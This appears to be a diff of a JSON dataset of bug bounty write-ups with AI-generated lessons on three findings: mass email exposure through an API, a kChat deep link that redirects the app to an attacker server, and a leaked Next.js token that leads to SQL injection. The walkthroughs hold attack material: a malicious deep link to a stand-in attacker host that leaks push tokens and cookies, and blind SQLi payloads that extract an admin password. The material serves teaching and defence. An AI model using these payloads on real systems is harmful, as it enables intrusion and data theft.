@@ -141,32 +141,75 @@
     "published_at": "2026-11-17T22:09:27.000Z",
     "added_at": "2026-11-18T02:40:35.807Z",
     "categories": [
-      "info-disclosure"
+      "info-disclosure",
+      "access-control"
     ],
     "severity": "high",
-    "difficulty": null,
-    "summary_en": "A single API request allowed an attacker to retrieve over 14,000 user email addresses, leading to a significant information disclosure vulnerability.",
+    "difficulty": "beginner",
+    "summary_en": "An API endpoint designed to load course discussions inadvertently leaked the full names, internal IDs, and email addresses of over 14,000 users, including students, trainers, and administrators.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": "Imagine a website 'social.example' that has a feature to search for friends. When you search for a name, the website sends a request to an API (a system that allows two programs to talk to each other) at 'https://api.social.example/v1/search?name=john'. Instead of just returning the names and profile pictures, the server sends back a list of every user in the database, including their private email addresses. \n\nExample Request:\nGET /v1/users/all HTTP/1.1\nHost: api.social.example\n\nExample Response:\n[\n  {\n    \"id\": 1,\n    \"username\": \"john_doe\",\n    \"email\": \"john@private.com\"\n  },\n  {\n    \"id\": 2,\n    \"username\": \"jane_smith\",\n    \"email\": \"jane@secret.org\"\n  }\n]\n\nWhy it works: The developer forgot to filter the data. They used a 'SELECT *' query (a command to get every piece of information from a database table) and sent the entire result directly to the user's browser. A beginner might think this is fine because the email isn't shown on the screen, but anyone can open the 'Network' tab (a tool in the browser that shows all data coming in and out) to see the hidden data.",
-      "takeaway": null,
-      "fix": null,
+      "cause": "The root cause was an insecure API design on the endpoint /api/v1/discussions/loadStreams.do which practiced 'over-fetching.' Instead of returning only the data needed for a discussion (like a username and comment), the server-side code pulled the entire user object from the database and sent it to the client. This included the 'email' field, which should have been private. Furthermore, the application lacked strict enrollment validation, allowing any unverified account to join free courses and access this data.",
+      "walkthrough": "RECONNAISSANCE\n1. The researcher signed up for an account on the internship platform. They noticed that the platform did not require email verification (confirming you own the email address) to start using the site.\n2. They searched for 'Free' or 'Open' courses that allowed immediate enrollment without payment or approval.\n\nDISCOVERY\n3. After enrolling in a free course, the researcher navigated to the 'Course Discussions' section. This is a feature where students can talk to each other.\n4. They used Burp Suite (a tool that intercepts and displays the hidden messages between your browser and the server) to watch the traffic.\n5. They identified a specific HTTP request (a message sent to the server) used to load the discussion content:\nPOST /api/v1/discussions/loadStreams.do HTTP/1.1\nWhy: This is the API endpoint (a specific digital 'window' on the server) responsible for fetching discussion data.\n\nEXPLOITATION\n6. The researcher sent this request to the 'Repeater' tool in Burp Suite to examine the server's response (the data sent back to the browser).\n7. They observed the JSON response (a structured list of data) which contained a list called 'usersInfo'.\n{\n \"usersInfo\": [\n {\n \"name\": \"John Doe\",\n \"email\": \"john.doe@example.com\",\n \"id\": \"12345\"\n }\n ]\n}\nWhy: The server was sending the 'email' field even though it wasn't needed to display a discussion post.\n8. The researcher noticed that the list included users who had never even posted a comment in the discussion.\n9. They further observed that the list included the email addresses of 'Trainers' and 'Administrators' associated with the course.\n\nIMPACT\n10. To prove the scale, the researcher repeated this process for several other free courses.\n11. By aggregating the data from these API responses, they collected over 14,000 unique email addresses.\n12. This demonstrated that an attacker could automate this process to harvest a massive database of user emails for phishing (sending fake emails to steal passwords) or spam.",
+      "example": "Imagine a fictional website 'target.example' that has a 'Team Members' page. When you visit the page, you only see names and photos. However, if you look at the hidden API request used to load that page (e.g., GET /api/members), the server sends back: {'name': 'Alice', 'photo': 'alice.jpg', 'private_phone': '555-0199', 'home_address': '123 Secret St'}. Even though the website doesn't show the phone number or address on the screen, the data is still sent to your computer. An attacker can simply read this hidden data to steal private information about every employee.",
+      "takeaway": "This is a classic case of 'Excessive Data Exposure.' As a hunter, always inspect the raw JSON responses of API calls, even if the website looks normal on the surface. Look for fields like 'email', 'phone', 'address', or 'role' that aren't visible in the User Interface (UI). A common variant is finding 'is_admin: true' in a user profile response, which might suggest you can change your own permissions. Avoid the mistake of assuming that if a piece of data isn't visible on the screen, it isn't being sent to the browser.",
+      "fix": "The developers should implement a Data Transfer Object (DTO) or a 'projection' layer. Instead of sending the entire User database record to the API, they should create a specific model that only contains the 'name' and 'imageUrl' fields. Any sensitive fields like 'email' or 'internal_id' should be explicitly excluded at the code level before the data is converted to JSON. \n\nExample of fixed logic (Pseudocode):\n\n// BAD: Returns everything\nreturn database.getUsers(courseId);\n\n// GOOD: Returns only public info\nreturn database.getUsers(courseId).map(user => {\n  return { name: user.name, image: user.imageUrl };\n});",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
       "takeaway_ar": null,
       "fix_ar": null
     },
-    "excerpt": null,
+    "excerpt": "_What initially looked like a small information disclosure turned into something much bigger. The interesting part wasn’t just finding the bug, but figuring out how easily anyone could exploit it._ While testing an online internship and training platform, I came across a feature that allowed enrolled users to interact through course discussions. As usual, I started inspecting the background API requests using Burp Suite. One request caught my attention. It was responsible for loading discussion-related information. I sent it to Repeater and started examining the JSON response. ## The first clu",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
+    "id": "eb920c015d3b",
+    "title": "How a Login Link Could Switch kChat to an Attacker’s Server",
+    "url": "https://medium.com/@debasishtripathy7987/how-a-login-link-could-switch-kchat-to-an-attackers-server-6a1601e3cd9a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Debasishtripathy"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-17T12:17:19.000Z",
+    "added_at": "2026-11-17T20:46:35.520Z",
+    "categories": [
+      "access-control",
+      "info-disclosure",
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A vulnerability in kChat for Android allowed attackers to use a malicious deep link to force the app to connect to an attacker-controlled server, leaking the device's push token and hijacking future messages.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause was the application's failure to validate the server address parameter within its custom deep link handler. The app extracted a server URL from a link like 'kchat://<server-address>/login/one_time_link' and immediately used it to configure the app's backend connection. Because there was no whitelist check to ensure the address belonged to a trusted Infomaniak domain, the app would treat any attacker-supplied URL as a legitimate workspace. This allowed the app to send sensitive device identifiers to the rogue server and provision it as the active workspace for the user.",
+      "walkthrough": "RECON\n1. Examine the 'AndroidManifest.xml' file (a file that tells Android how the app works) to find 'intent-filters' that handle custom URL schemes.\n2. Identify that the app registers 'kchat://', 'kChat://', and 'mmauthbeta://' as browsable schemes (links that can be opened from a browser).\n\nDISCOVERY\n3. Analyze the URL structure used for magic link logins (a way to log in without a password using a special link).\n4. Find the target route: 'kchat://<server-address>/login/one_time_link?t=<token>'.\n5. Observe that the app extracts the '<server-address>' and the 't' (token) parameter without verifying the destination.\n\nEXPLOITATION\n6. Set up a malicious server (a 'stub') that mimics a real kChat/Mattermost server by responding to basic configuration and health check requests.\n7. Craft a malicious deep link pointing to the attacker's server:\n'kchat://attacker-server.com/login/one_time_link?t=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'\n8. Induce a user to click this link (e.g., via a phishing website or another app).\n9. The Android system passes this link to the kChat app.\n10. The app processes the link and sends a POST request (a message sending data to a server) to the attacker's server to attempt a login.\n'POST /api/v4/users/login'\n11. The payload (the data inside the request) contains the 'magic_link_token' and the 'device_id' (the device's unique push notification token).\n'{\"magic_link_token\": \"abcdef...\", \"device_id\": \"<redacted_push_token>\"}'\n\nIMPACT\n12. The attacker captures the 'device_id' from their server logs.\n13. The app successfully provisions the attacker's server as a new 'workspace' (a specific environment inside the app).\n14. Because the attacker's workspace is now active, any messages the user types in that workspace are sent directly to the attacker's server instead of the legitimate one.",
+      "example": "Imagine a fictional banking app called 'EasyBank' that uses a deep link to let users join a 'Family Group' by clicking 'easybank://join?server=bank-api.com&group=123'. If the app doesn't check the 'server' parameter, an attacker could send a link like 'easybank://join?server=evil-bank.com&group=666'. When the user clicks it, the app connects to 'evil-bank.com' and sends the user's session cookie (a small file used to keep you logged in) to the attacker. From then on, the app might show fake balance information or send transaction requests to the attacker's server instead of the real bank.",
+      "takeaway": "When hunting for mobile vulnerabilities, always audit 'AndroidManifest.xml' for custom URL schemes and trace how the parameters in those links are used. If a parameter controls a URL that the app later contacts, it is a high-value target for SSRF (Server-Side Request Forgery) or unauthorized configuration. A common mistake is assuming that checking the format of a token (like ensuring it is 64 characters) is enough security; the real danger often lies in the destination where that token is sent. Look for 'magic link' or 'auto-config' features as they frequently bypass standard login protections.",
+      "fix": "The application must validate the 'server-address' parameter against a hardcoded whitelist of trusted domains before initiating any network requests. Additionally, the app should use a secure URL parsing library to extract the hostname and verify it again after following any HTTP redirects to ensure the final destination is still trusted. \n\nExample fix in code:\n'String serverUrl = uri.getHost();\nif (!trustedDomains.contains(serverUrl)) {\n    throw new SecurityException(\"Untrusted server address\");\n}\n// Proceed with login only if domain is valid'",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "_A High severity Android finding involving deep link validation, push token disclosure, and messages sent to an attacker controlled workspace._ **Debasish Tripathy** · Application security research > **_Private review draft — not cleared for publication._**_The program rules supplied with this report prohibit partial and full disclosure. Obtain Infomaniak’s written approval for this article and any accompanying images before publishing. This draft contains no bounty information._ A login link in kChat for Android could decide which server the app trusted. The app took a server address from an",
     "ai_generated": true,
     "engagement": null,
     "score": 53
   },
   {
     "id": "d34d33073380",
-    "title": "I Ignored a NEXT_PUBLIC_ Token for a Week. Then It Unlocked Blind SQLi and the Whole Database",
+    "title": "I Ignored a NEXT_PUBLIC_ Token for a Week. Then It Unlocked Blind SQLi and the Whole Database 🔓",
     "url": "https://medium.com/@akash.sundaramoorthi1/i-ignored-a-next-public-token-for-a-week-then-it-unlocked-blind-sqli-and-the-whole-database-6b61f3c1e07d",
     "source": {
       "slug": "medium-tag-writeup",
@@ -182,25 +225,26 @@
     "added_at": "2026-11-17T20:46:57.008Z",
     "categories": [
       "sqli",
-      "info-disclosure"
+      "info-disclosure",
+      "access-control"
     ],
     "severity": "critical",
     "difficulty": "intermediate",
-    "summary_en": "A leaked NEXT_PUBLIC_ environment variable provided access to a restricted interface, which was found to be vulnerable to Blind SQL Injection, allowing for full database extraction.",
+    "summary_en": "A leaked API token and tenant ID allowed access to a member API where the 'fields' parameter was vulnerable to SQL injection, enabling unauthorized database access.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": "In this scenario, we look at a fictional target 'target.example'.\n\n1. **The Leak**: A developer creates a file to store settings called an Environment Variable (a configuration value stored outside the application code). They name a sensitive key 'NEXT_PUBLIC_INTERNAL_API_KEY=7a8b9c'. Because it starts with 'NEXT_PUBLIC_', the Next.js framework automatically sends this key to every user's Browser (the software like Chrome used to view websites).\n\n2. **The Discovery**: An attacker opens the browser's developer tools, searches for 'NEXT_PUBLIC', and finds the key. They also find a hidden Endpoint (a specific web address used by computers to talk to each): 'https://api.target.example/v2/inventory'.\n\n3. **The Vulnerability**: The attacker tries to use the key to see the inventory by sending an HTTP Request (a message sent from a browser to a server):\n`GET /v2/inventory?item=laptop&token=7a8b9c HTTP/1.1` \nThe server responds with a list of laptops.\n\n4. **The SQL Injection**: The attacker tests if the 'item' Parameter (a piece of data sent in the URL) is handled safely. They send a single quote ('), which is a special character in SQL (the language used to talk to databases). \n`GET /v2/inventory?item=laptop'&token=7a8b9c HTTP/1.1` \nThe server returns an error, suggesting the quote broke the database command.\n\n5. **The Blind Exploit**: The attacker uses a 'Blind' technique, asking the database a True/False question. This is called Blind SQLi (a vulnerability where an attacker infers data by observing how the server responds to logic tests).\n`GET /v2/inventory?item=laptop' AND (SELECT 1)=1--&token=7a8b9c HTTP/1.1` \nBecause '1=1' is True, the page loads normally. If they change it to '1=2' (False), the page returns no results. The '--' tells the database to ignore the rest of the original command.\n\n6. **Data Theft**: The attacker can now ask: 'Is the first letter of the admin password A?'\n`GET /v2/inventory?item=laptop' AND (SELECT SUBSTR(password,1,1) FROM users WHERE role='admin')='A'--&token=7a8b9c HTTP/1.1` \nBy automating this for every letter, the attacker steals the entire database.",
-      "takeaway": null,
-      "fix": null,
+      "cause": "The application exposed sensitive environment variables (NEXT_PUBLIC_ API keys) to the client side, which are meant to be secret. Furthermore, the backend endpoint /api/member used string concatenation to build SQL queries using the 'fields' parameter as a column identifier. Since SQL prepared statements (a secure way to write queries) typically only parameterize values, not identifiers like column names, this manual string building created a direct injection point.",
+      "walkthrough": "RECON\n1. The researcher performed subdomain enumeration (finding all sub-sites like blog.example.com) and JS analysis (reading the website's code to find hidden functions) on an Indian D2C company.\n2. They checked the page source (the raw code of the website) and found leaked environment variables (settings stored on a server).\nNEXT_PUBLIC_API_KEY=\"...\" NEXT_PUBLIC_API_URL=\"...\"\nWhy: NEXT_PUBLIC_ variables in Next.js are baked into the client-side code and are visible to any visitor (A beginner gloss: these are like leaving your house keys under the mat with a sign pointing to them).\n\nDISCOVERY\n3. The researcher attempted to use the leaked token (a digital key) with a curl command (a tool to send web requests) but received a 400 error (Bad Request).\ncurl -s https://api.target.in -H \"Authorization: Bearer <LEAKED-TOKEN>\"\nWhy: The error indicated the API key was valid but the system didn't know which 'tenant' (a specific organization's data) to access.\n4. They investigated an acquired company's site and found a specific header (extra info in a web request) in the network traffic using Burp (a tool to intercept web traffic).\nX-Tenant-Id: brand-name\nWhy: This provided the missing piece of the puzzle needed to route the API request correctly.\n5. They found a specific endpoint (a web address for an API) in the JavaScript files that looked interesting.\n/api/member?id=<id>&fields=given_name,email_addr\nWhy: Parameters (info added to a URL) that define which columns (categories of data) to return often indicate that the server is building a database query dynamically.\n\nEXPLOITATION\n6. The researcher combined the leaked token and the discovered tenant ID to successfully query their own account data.\ncurl -s https://api.acquisition.com/api/member?id=<my_id>&fields=given_name,email_addr -H \"X-Tenant-Id: brand-name\" -H \"X-Api-Token: <LEAKED-TOKEN>\"\nWhy: This proved the credentials worked and they could now interact with the private API.\n7. They tested for SQL Injection (a bug where an attacker runs commands on a database) by providing a non-existent column name to the 'fields' parameter.\nGET /api/member?id=<my_id>&fields=zzz\nWhy: If the server is insecure, it will try to find a column named 'zzz' and might return an error message explaining what happened.\n8. The server returned a detailed error message revealing the internal SQL query (a command sent to a database).\n{ \"error\": \"column member.zzz does not exist\", \"query\": \"SELECT member.zzz FROM member WHERE member.id = <my_id>\" }\nWhy: This confirmed that the input 'zzz' was placed directly into the SELECT clause of the query without any security checks (A beginner gloss: the server is literally repeating what you say directly to the database engine).",
+      "example": "Imagine a site target.example that lets users sort products. The URL looks like: https://target.example/products?sort_by=price. The backend code is: query = \"SELECT * FROM products ORDER BY \" + req.query.sort_by. An attacker changes the URL to: https://target.example/products?sort_by=(CASE WHEN (SELECT 1)=1 THEN price ELSE name END). Because the developer joined the text together (concatenation) instead of using a safe method, the database executes the attacker's logic. This allows the attacker to slowly extract secret data by seeing how the sorting changes based on their 'CASE' conditions.",
+      "takeaway": "Always inspect NEXT_PUBLIC_ variables in Next.js applications for sensitive keys that should remain server-side. When you encounter parameters that look like database column names (e.g., 'fields', 'sort', 'order'), test them for injection even if standard payloads like \"' OR 1=1\" fail. These are 'Identifier Injections' where you are injecting into the SELECT or ORDER BY clause, not the WHERE clause. A common mistake is assuming that because you can't use a single quote, the field is safe; identifiers often don't require quotes to be manipulated.",
+      "fix": "To fix this, never use string concatenation to build SQL queries with user input. For dynamic column selection, use an 'allow-list' (a predefined list of safe strings) to validate the input before placing it in the query. Additionally, ensure environment variables intended for the backend are not prefixed with NEXT_PUBLIC_.\n\n// Fixed Code Example (Node.js):\nconst allowedFields = ['given_name', 'email_addr'];\nconst userField = req.query.fields;\nif (allowedFields.includes(userField)) {\n  const query = `SELECT ${userField} FROM member WHERE id = ?`;\n  db.execute(query, [userId]);\n} else {\n  throw new Error('Invalid field');\n}",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
       "takeaway_ar": null,
       "fix_ar": null
     },
-    "excerpt": null,
+    "excerpt": "I'm venturing into cyber security as a beginner, eager to safeguard digital landscapes and empower others through blogging. I share my learnings through blogs. writer Bug Bounty Tips Bug Bounty Writeup Pentesting Vulnerability Bug Bounty # I Ignored a NEXT_PUBLIC_ Token for a Week. Then It Unlocked Blind SQLi and the Whole Database 🔓 Image 3: Akash Sundaramoorthi Akash Sundaramoorthi 6 min read · 3 days ago [](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F6b61f3c1e07d&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40akash.sundaramoorthi1%2Fi-ignored-",
     "ai_generated": true,
     "engagement": null,
     "score": 60
